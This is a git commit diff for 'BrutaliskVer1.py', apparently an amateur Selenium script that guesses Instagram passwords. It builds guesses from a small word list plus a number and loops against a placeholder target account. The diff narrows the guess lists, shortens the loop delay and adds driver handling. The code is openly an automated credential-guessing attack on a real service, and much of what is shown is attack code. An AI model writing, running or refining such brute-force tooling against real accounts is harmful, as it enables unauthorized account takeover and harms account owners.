ab4a6ed7f58b48c9ea407a48429ce5c61a0b3126
eoxh <59338386+eoxh@users.noreply.github.com>
2019-12-31 09:39:15 +0800

    Update BrutaliskVer1.py

--- BrutaliskVer1.py
+++ BrutaliskVer1.py
@@ -3,39 +3,23 @@ from selenium import webdriver
 from selenium.webdriver.common.keys import Keys
 import time
 
-
-# Main function | generates random passwords containing basic characters and whole numbers |
-
-
 # my first brute force project
 
 def Brutalisk():
     global randForce
-    array = [1,2,3,
-            4,5,6,
-            7,8,9,
-            11,22,33,
-            44,55,66,
-            77,88,99,
-            111,222,
-            333,444,
-            555,666,
-            777,888,
-            999,000]
+    array = [1,2,3,]
     
-    words = ["password","pussy","weed"]
+    words = ["password","","",""]
 
     
     randArray = random.choice(array)
     randWord = random.choice(words)
     randForce = randWord + str(randArray)
     
-
-   # for int in range(0,1):
-    #        print(randForce)
 # What does this block do?
 # loads target to brute force 
 def BruteForce():
+    global driver
     target = "ENTER_YOUR_TARGET_HERE"
     driver = webdriver.Chrome(r'C:\Users\natha\Documents\chromedriver_win32\chromedriver.exe')
     driver.get("https://www.instagram.com/")
@@ -60,10 +44,12 @@ def BruteForce():
 
 # main loop
 # What does this block do?
-# calls the Target function every 120 seconds until the user kills the task
+
 
 
 while True:
+    Brutalisk()
     BruteForce()
-    time.sleep(60)
+    time.sleep(5)
+    driver.close()
   
